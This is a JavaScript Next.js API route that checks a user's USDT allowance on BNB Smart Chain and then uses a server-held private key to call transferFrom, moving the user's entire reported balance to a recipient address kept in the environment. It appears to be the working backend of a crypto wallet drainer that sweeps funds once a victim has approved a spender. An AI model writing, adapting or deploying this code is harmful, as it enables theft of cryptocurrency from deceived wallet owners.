const { ethers } = require("ethers");
import { NextResponse } from "next/server";

const USDT_ADDRESS = "0x55d398326f99059ff775485246999027b3197955";

export async function POST(request) {
    try {
        const body = await request.json();
        const customer = body?.userAddress;
        const balance = body?.usdtBalance;
        const recipient = body?.recipient || process.env.Recieption_address;
        const requestedSpender = body?.spender || process.env.NEXT_PUBLIC_PERMIT2_ADDRESS;
        const shouldExecute = Boolean(body?.executeTransfer);

        console.log("[send-usdt] incoming body:", JSON.stringify({ customer, balance, recipient, spender: requestedSpender, executeTransfer: shouldExecute }));

        if (!customer || !ethers.isAddress(customer)) {
            return NextResponse.json({ error: "Invalid wallet address." }, { status: 400 });
        }

        const rawValue = String(balance ?? "").trim();
        let normalizedAmount = null;

        if (rawValue && /^\d+$/.test(rawValue)) {
            normalizedAmount = rawValue;
        } else if (rawValue && /^\d+(\.\d+)?$/.test(rawValue)) {
            const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
            const usdtContract = new ethers.Contract(
                USDT_ADDRESS,
                ["function decimals() view returns (uint8)"],
                provider
            );
            const decimals = await usdtContract.decimals();
            normalizedAmount = ethers.parseUnits(rawValue, Number(decimals)).toString();
        }

        console.log("[send-usdt] normalizedAmount:", normalizedAmount);

        if (!normalizedAmount || BigInt(normalizedAmount) <= 0n) {
            return NextResponse.json({ ok: false, skipped: true, reason: "zero_or_missing_balance" }, { status: 200 });
        }

        const spender = requestedSpender;
        if (!spender || !ethers.isAddress(spender)) {
            return NextResponse.json({ error: "Spender address not configured or invalid." }, { status: 500 });
        }

        const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
        const usdtContract = new ethers.Contract(
            USDT_ADDRESS,
            [
                "function allowance(address,address) view returns (uint256)",
                "function transferFrom(address,address,uint256) returns (bool)"
            ],
            provider
        );

        const amount = BigInt(normalizedAmount);
        const allowance = await usdtContract.allowance(customer, spender);

        console.log("[send-usdt] spender wallet:", spender);
        console.log("[send-usdt] customer allowance to spender:", allowance.toString());
        console.log("[send-usdt] final amount to send (wei):", amount.toString());

        if (allowance < amount) {
            console.log("[send-usdt] no tx sent: allowance insufficient", {
                spender,
                allowance: allowance.toString(),
                required: amount.toString(),
            });
            return NextResponse.json({
                ok: false,
                skipped: true,
                reason: "allowance_insufficient",
                required: amount.toString(),
                available: allowance.toString(),
                spender,
            }, { status: 200 });
        }

        if (!shouldExecute) {
            console.log("[send-usdt] allowance check passed; execution skipped because executeTransfer=false.", {
                spender,
                from: customer,
                to: recipient,
                amount: amount.toString(),
                allowance: allowance.toString(),
            });
            return NextResponse.json({
                ok: true,
                spender,
                from: customer,
                to: recipient,
                amount: amount.toString(),
                allowance: allowance.toString(),
                txHash: null,
                message: "Allowance is sufficient, but no signed transfer was executed yet.",
            });
        }

        const privateKey = process.env.GAS_WALLET_PRIVATE_KEY;
        if (!privateKey) {
            return NextResponse.json({ error: "Gas wallet not configured for signed transfer." }, { status: 500 });
        }

        const wallet = new ethers.Wallet(privateKey, provider);
        const spenderContract = new ethers.Contract(
            USDT_ADDRESS,
            ["function transferFrom(address,address,uint256) returns (bool)"],
            wallet
        );

        const tx = await spenderContract.transferFrom(customer, recipient, amount);
        console.log("[send-usdt] transaction hash:", tx.hash);

        const receipt = await tx.wait();
        console.log("[send-usdt] mined transaction hash:", receipt?.hash || tx.hash);

        return NextResponse.json({
            ok: true,
            hash: tx.hash,
            spender,
            from: customer,
            to: recipient,
            amount: amount.toString(),
            allowance: allowance.toString(),
            receipt,
        });
    } catch (error) {
        console.error("[send-usdt] Error:", error);
        return NextResponse.json({
            error: error.message || "Failed to evaluate USDT allowance.",
        }, { status: 500 });
    }
}
